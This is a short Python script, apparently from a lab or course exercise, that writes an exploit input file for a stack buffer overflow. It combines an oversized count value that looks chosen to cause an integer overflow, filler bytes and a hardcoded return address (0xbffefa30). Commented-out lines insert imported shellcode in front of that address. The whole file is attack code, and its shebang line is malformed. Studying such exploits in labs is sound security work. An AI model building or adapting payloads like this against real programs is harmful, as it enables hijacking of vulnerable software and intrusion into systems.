#!/user/bin/bash/python

from struct import pack
from shellcode import shellcode

count = 1073741838
f = open("tmp", "wb")
#buf_ret_addr = pack("<I", 0
#f.write(pack("<I", count) + "A"*53 + "B"*7)
#f.write(pack("<I", count) + shellcode + "B"*7 + "B"*44 + pack("<I", 0xbffefa30))
#lets just fill buffer for now
addr = pack("<I", 0xbffefa30)
f.write(pack("<I", count) + "A"*53 + "B"*3 + "C"*4 + addr)
#f.write(out)
f.close()
